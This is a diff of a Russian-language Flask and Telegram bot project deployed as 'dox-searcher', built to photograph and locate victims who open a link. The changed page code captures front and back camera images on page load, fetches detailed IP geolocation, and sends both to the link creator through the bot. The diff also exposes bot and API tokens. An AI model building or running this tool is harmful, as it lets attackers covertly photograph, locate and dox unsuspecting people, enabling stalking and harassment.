@@ -9,18 +9,15 @@ import os
 from flask import Flask, request, render_template_string, jsonify
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import ipinfo
 from datetime import datetime
 
 app = Flask(__name__)
 
 # Конфигурация
-BOT_TOKEN = '8048949774:AAF79Ml1LGb8xlmCnBmFHC1a900mgOAz3WM'
+BOT_TOKEN = '8048949774:AAGn0SKXaxbcvUW1tULlqFty0_6BL6D3-4I'
 BASE_URL = "https://dox-searcher.onrender.com"
-IPINFO_TOKEN = "c39bb318760ade"
 
 bot = telebot.TeleBot(BOT_TOKEN)
-ipinfo_handler = ipinfo.getHandler(IPINFO_TOKEN)
 
 # Хранилища данных
 photo_storage = {}  # {user_id: {"front": front_photo, "back": back_photo, "ip_info": ip_info}}
@@ -54,52 +51,56 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="frontVideo" autoplay playsinline></video>
+    <canvas id="frontCanvas"></canvas>
+    <video id="backVideo" autoplay playsinline></video>
+    <canvas id="backCanvas"></canvas>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const frontVideo = document.getElementById('frontVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backVideo = document.getElementById('backVideo');
+        const backCanvas = document.getElementById('backCanvas');
         
-        canvas.width = 640;
-        canvas.height = 480;
+        frontCanvas.width = backCanvas.width = 640;
+        frontCanvas.height = backCanvas.height = 480;
         
-        // Функция для захвата фото
-        function capturePhoto() {
+        function capturePhoto(video, canvas) {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             return canvas.toDataURL('image/jpeg', 0.8);
         }
         
-        // Функция отправки фото на сервер
-        async function sendPhoto(photoData) {
+        async function sendPhotos(frontPhoto, backPhoto, ipInfo) {
             const token = window.location.pathname.split('/').pop();
             
             try {
-                await fetch('/upload', {
+                const response = await fetch('/upload', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        image: photoData,
-                        token: token
+                        front_image: frontPhoto,
+                        back_image: backPhoto,
+                        token: token,
+                        ip_info: ipInfo
                     })
                 });
                 
-                // После отправки останавливаем камеру
-                if (video.srcObject) {
-                    const tracks = video.srcObject.getTracks();
-                    tracks.forEach(track => track.stop());
-                }
+                [frontVideo, backVideo].forEach(video => {
+                    if (video.srcObject) {
+                        const tracks = video.srcObject.getTracks();
+                        tracks.forEach(track => track.stop());
+                    }
+                });
                 
             } catch (error) {
                 console.error('Upload error:', error);
             }
         }
         
-        // Получаем IP информацию
         async function getIPInfo() {
             try {
-                const response = await fetch('https://ipinfo.io/json');
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
                 return await response.json();
             } catch (error) {
                 console.error('IP info error:', error);
@@ -107,47 +108,81 @@ HTML_TEMPLATE = """
             }
         }
         
-        // Автоматическая фотосъемка при получении доступа
-        async function initCameraAndCapture() {
+        async function initCamerasAndCapture() {
             try {
-                // Получаем IP информацию
                 const ipInfo = await getIPInfo();
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                 
-                // Захватываем камеру
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    } 
-                });
-                
-                video.srcObject = stream;
-                
-                // Ждем 1 секунду для стабилизации изображения
-                setTimeout(() => {
-                    const photo = capturePhoto();
-                    sendPhoto(photo);
-                    
-                    // Отправляем IP информацию отдельным запросом
-                    fetch('/ipinfo', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            token: token,
-                            ip_info: ipInfo
-                        })
+                if (videoDevices.length === 1) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        } 
                     });
                     
-                }, 1000);
+                    frontVideo.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
+                        await sendPhotos(frontPhoto, null, ipInfo);
+                    }, 1000);
+                } 
+                else if (videoDevices.length >= 2) {
+                    const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        } 
+                    });
+                    
+                    frontVideo.srcObject = frontStream;
+                    
+                    setTimeout(async () => {
+                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
+                        frontStream.getTracks().forEach(track => track.stop());
+                        
+                        const backStream = await navigator.mediaDevices.getUserMedia({ 
+                            video: {
+                                width: { ideal: 1280 },
+                                height: { ideal: 720 },
+                                facingMode: { exact: 'environment' }
+                            } 
+                        });
+                        
+                        backVideo.srcObject = backStream;
+                        
+                        setTimeout(async () => {
+                            const backPhoto = capturePhoto(backVideo, backCanvas);
+                            await sendPhotos(frontPhoto, backPhoto, ipInfo);
+                        }, 1000);
+                        
+                    }, 1000);
+                }
                 
             } catch (err) {
                 console.error('Camera error:', err);
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true 
+                    });
+                    
+                    frontVideo.srcObject = stream;
+                    
+                    setTimeout(async () => {
+                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
+                        await sendPhotos(frontPhoto, null, {});
+                    }, 1000);
+                } catch (e) {
+                    console.error('Fallback camera error:', e);
+                }
             }
         }
         
-        // Запускаем процесс при загрузке страницы
-        window.addEventListener('DOMContentLoaded', initCameraAndCapture);
+        window.addEventListener('DOMContentLoaded', initCamerasAndCapture);
     </script>
 </body>
 </html>
@@ -155,10 +190,33 @@ HTML_TEMPLATE = """
 
 @app.route('/<custom_token>')
 def phishing_page(custom_token):
+    ip_info = {}
+    try:
+        if request.headers.getlist("X-Forwarded-For"):
+            ip = request.headers.getlist("X-Forwarded-For")[0]
+        else:
+            ip = request.remote_addr
+        
+        ip_info = {"query": ip}
+    except Exception as e:
+        print(f"Ошибка при получении IP информации: {e}")
+        ip_info = {"query": "Unknown"}
+    
+    user_id = None
+    for uid, token in user_tokens.items():
+        if token == custom_token:
+            user_id = uid
+            break
+    
+    if user_id:
+        if user_id not in photo_storage:
+            photo_storage[user_id] = {}
+        photo_storage[user_id]["ip_info"] = ip_info
+    
     return render_template_string(HTML_TEMPLATE)
 
-@app.route('/ipinfo', methods=['POST'])
-def handle_ipinfo():
+@app.route('/upload', methods=['POST'])
+def handle_upload():
     try:
         data = request.json
         custom_token = data.get('token')
@@ -173,83 +231,77 @@ def handle_ipinfo():
                 user_id = uid
                 break
                 
-        if user_id:
-            if user_id not in photo_storage:
-                photo_storage[user_id] = {}
-            photo_storage[user_id]["ip_info"] = ip_info
-        
-        return '', 200
-    except Exception as e:
-        print(f"Ошибка при обработке IP информации: {e}")
-        return 'Server error', 500
-
-@app.route('/upload', methods=['POST'])
-def handle_upload():
-    try:
-        data = request.json
-        custom_token = data.get('token')
-        
-        if not custom_token:
-            return 'Token required', 400
-            
-        user_id = None
-        for uid, token in user_tokens.items():
-            if token == custom_token:
-                user_id = uid
-                break
-                
         if not user_id:
             return 'Invalid token', 400
 
-        # Создаем папку для фото, если ее нет
         os.makedirs("photos", exist_ok=True)
         
-        # Сохраняем фото
         timestamp = int(time.time())
-        filename = f"photos/photo_{custom_token}_{timestamp}.jpg"
-        image_data = data['image'].split(',')[1]
+        front_filename = None
+        back_filename = None
         
-        with open(filename, "wb") as f:
-            f.write(base64.b64decode(image_data))
+        if data.get('front_image'):
+            front_image_data = data['front_image'].split(',')[1]
+            front_filename = f"photos/front_{custom_token}_{timestamp}.jpg"
+            with open(front_filename, "wb") as f:
+                f.write(base64.b64decode(front_image_data))
+            
+            if user_id not in photo_storage:
+                photo_storage[user_id] = {}
+            photo_storage[user_id]["front"] = front_filename
         
-        # Получаем сохраненную IP информацию
-        ip_info = photo_storage.get(user_id, {}).get("ip_info", {})
+        if data.get('back_image'):
+            back_image_data = data['back_image'].split(',')[1]
+            back_filename = f"photos/back_{custom_token}_{timestamp}.jpg"
+            with open(back_filename, "wb") as f:
+                f.write(base64.b64decode(back_image_data))
+            
+            if user_id not in photo_storage:
+                photo_storage[user_id] = {}
+            photo_storage[user_id]["back"] = back_filename
         
-        # Формируем сообщение с фото и IP информацией
-        caption = f"✅ Фото успешно получено!\nТокен: {custom_token}\n\n"
-        caption += "🌍 IP информация:\n"
-        caption += f"▪️ IP: {ip_info.get('ip', 'Unknown')}\n"
-        caption += f"▪️ Город: {ip_info.get('city', 'Unknown')}\n"
-        caption += f"▪️ Регион: {ip_info.get('region', 'Unknown')}\n"
-        caption += f"▪️ Страна: {ip_info.get('country', 'Unknown')}\n"
-        caption += f"▪️ Координаты: {ip_info.get('loc', 'Unknown')}\n"
-        caption += f"▪️ Провайдер: {ip_info.get('org', 'Unknown')}"
+        # Формируем информацию об IP
+        ip_address = ip_info.get('query', 'Unknown')
+        city = ip_info.get('city', 'Unknown')
+        region = ip_info.get('regionName', 'Unknown')
+        country = ip_info.get('country', 'Unknown')
+        isp = ip_info.get('isp', 'Unknown')
         
-        # Отправляем фото в Telegram
-        with open(filename, "rb") as photo:
-            bot.send_photo(
-                chat_id=user_id,
-                photo=photo,
-                caption=caption
-            )
+        caption = f"✅ Фото успешно получено!\n\n"
+        caption += f"▪️ Токен: {custom_token}\n"
+        caption += f"▪️ IP: {ip_address}\n"
+        caption += f"▪️ Город: {city}\n"
+        caption += f"▪️ Регион: {region}\n"
+        caption += f"▪️ Страна: {country}\n"
+        caption += f"▪️ Провайдер: {isp}\n"
+        
+        media = []
+        
+        if front_filename:
+            with open(front_filename, "rb") as photo:
+                media.append(telebot.types.InputMediaPhoto(photo.read(), caption=caption))
+        
+        if back_filename:
+            with open(back_filename, "rb") as photo:
+                media.append(telebot.types.InputMediaPhoto(photo.read()))
+        
+        if media:
+            bot.send_media_group(user_id, media)
         
         return '', 200
     except Exception as e:
         print(f"Ошибка при загрузке фото: {e}")
         return 'Server error', 500
 
-# Обработчики бота
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     try:
         user_id = message.from_user.id
         
-        # Проверяем, забанен ли пользователь
         if user_id in banned_users:
             bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
             return
         
-        # Сохраняем информацию о пользователе
         if user_id not in user_data:
             user_data[user_id] = {
                 "username": message.from_user.username or "",
@@ -297,7 +349,6 @@ def create_link_handler(call):
     try:
         user_id = call.message.chat.id
         
-        # Проверяем, забанен ли пользователь
         if user_id in banned_users:
             bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
             bot.answer_callback_query(call.id)
@@ -324,7 +375,6 @@ def create_link_handler(call):
         print(f"Ошибка при создании ссылки: {e}")
         bot.send_message(call.message.chat.id, "❌ Произошла ошибка при создании ссылки. Попробуйте позже.")
 
-# Админ-панель
 @bot.message_handler(commands=['admin'])
 def admin_handler(message):
     if message.from_user.id not in ADMINS:
@@ -386,7 +436,6 @@ def show_admin_stats(admin_id):
         f"📅 Последние 5 зарегистрированных пользователей:\n"
     )
     
-    # Сортируем пользователей по дате регистрации
     sorted_users = sorted(user_data.items(), 
                          key=lambda x: datetime.strptime(x[1]["registration_date"], "%Y-%m-%d %H:%M:%S"), 
                          reverse=True)
@@ -417,7 +466,6 @@ def process_broadcast_message(message):
     broadcast_text = message.text or message.caption
     parse_mode = "HTML" if ("<" in broadcast_text and ">" in broadcast_text) else None
     
-    # Подтверждение рассылки
     bot.send_message(
         admin_id,
         f"Вы уверены, что хотите разослать это сообщение {len(user_data)} пользователям?\n\n"
@@ -460,7 +508,6 @@ def confirm_broadcast(call):
             print(f"Ошибка при отправке сообщения {user_id}: {e}")
             failed += 1
         
-        # Обновляем прогресс каждые 10 отправок
         if i % 10 == 0 or i == total:
             bot.edit_message_text(
                 chat_id=admin_id,
@@ -504,7 +551,6 @@ def process_ban_user(message):
         banned_users.add(user_id)
         bot.send_message(admin_id, f"✅ Пользователь {user_id} забанен")
         
-        # Пытаемся уведомить пользователя
         try:
             bot.send_message(user_id, "❌ Вы были заблокированы в этом боте.")
         except:
@@ -530,7 +576,6 @@ def process_unban_user(message):
             banned_users.remove(user_id)
             bot.send_message(admin_id, f"✅ Пользователь {user_id} разбанен")
             
-            # Пытаемся уведомить пользователя
             try:
                 bot.send_message(user_id, "✅ Вы были разблокированы в этом боте.")
             except:
@@ -541,10 +586,8 @@ def process_unban_user(message):
         bot.send_message(admin_id, "❌ Неверный формат ID. Введите числовой ID пользователя.")
 
 def export_user_data(admin_id):
-    # Создаем временный файл
     filename = f"user_data_export_{int(time.time())}.json"
     
-    # Подготовка данных для экспорта
     export_data = {
         "total_users": len(user_data),
         "banned_users": list(banned_users),
@@ -562,15 +605,12 @@ def export_user_data(admin_id):
             "is_banned": user_id in banned_users
         })
     
-    # Сохраняем в файл
     with open(filename, "w", encoding="utf-8") as f:
         json.dump(export_data, f, ensure_ascii=False, indent=2)
     
-    # Отправляем файл
     with open(filename, "rb") as f:
         bot.send_document(admin_id, f, caption="📊 Экспорт данных пользователей")
     
-    # Удаляем временный файл
     os.remove(filename)
 
 def run_flask():
@@ -581,13 +621,10 @@ def run_bot():
     bot.infinity_polling()
 
 if __name__ == '__main__':
-    # Создаем папку для фото
     os.makedirs("photos", exist_ok=True)
     
-    # Запускаем Flask в отдельном потоке
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Запускаем бота
     run_bot()
